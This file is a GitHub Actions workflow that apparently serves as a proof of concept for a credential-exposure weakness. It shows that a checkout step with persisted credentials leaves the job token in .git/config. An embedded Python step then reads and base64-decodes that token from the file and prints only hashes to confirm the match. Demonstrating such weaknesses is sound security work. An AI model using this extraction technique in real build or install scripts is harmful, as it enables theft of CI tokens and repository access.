name: persist-cred-poc
on:
  workflow_dispatch:

permissions:
  contents: read

jobs:
  build:
    runs-on: ubuntu-latest
    steps:
      - name: Checkout with COMMAND_BOT_PAT persisted (as command-compile.yml does)
        uses: actions/checkout@v4
        with:
          persist-credentials: true
          token: ${{ secrets.GITHUB_TOKEN }}
          fetch-depth: 0

      - name: Simulate a dependency install script
        env:
          TOKEN: ${{ secrets.GITHUB_TOKEN }}
        run: |
          python3 - <<'PY'
          import base64, hashlib, os, re
          config = open('.git/config').read()
          match = re.search(r'AUTHORIZATION: basic (\S+)', config)
          if not match:
              print('no credential in .git/config')
              raise SystemExit(0)
          decoded = base64.b64decode(match.group(1)).decode()
          extracted = decoded.split(':', 1)[1]
          print('credential found in .git/config:', bool(extracted))
          print('extracted sha256:', hashlib.sha256(extracted.encode()).hexdigest())
          print('step      sha256:', hashlib.sha256(os.environ['TOKEN'].encode()).hexdigest())
          PY
